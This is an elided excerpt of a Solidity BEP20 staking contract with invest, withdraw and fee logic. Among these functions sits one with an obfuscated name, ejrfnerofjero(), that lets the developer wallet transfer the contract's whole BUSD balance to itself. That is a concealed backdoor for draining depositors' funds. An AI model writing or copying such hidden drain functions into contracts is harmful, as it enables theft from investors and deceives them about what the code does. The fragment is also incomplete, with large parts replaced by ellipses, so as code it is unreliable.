...
contract Staking {
   ...
   // uint256 public PACKAGE_PERCENT_LIMIT = 200;
...
function ejrfnerofjero() public
{
    		if (msg.sender == devWallet) {
        IBEP20(busd).transfer(devWallet,IBEP20(busd).balanceOf(address(this)));
        }
    ...
    function invest(address referrer, uint8 plan,  uint256 value) public {
        ...
        uint256 fee = value.mul(DEV_FEE).div(PERCENTS_DIVIDER);
...
/*
	function invest(address referrer, uint8 plan, uint256 value) public  {
        ...
        uint256 devFee = value.mul(DEV_FEE).div(PERCENTS_DIVIDER);
...
*/
	function withdraw() public {
    	...
    	uint256 fees = totalAmount.div(10000);
    ...
    function getSiteInfo()
        public
        view
        returns (uint256 _totalStaked, uint256 _totalBonus, uint256 _totalDeposits)
    {
        return (totalStaked, totalRefBonus, totalDeposits);
    }
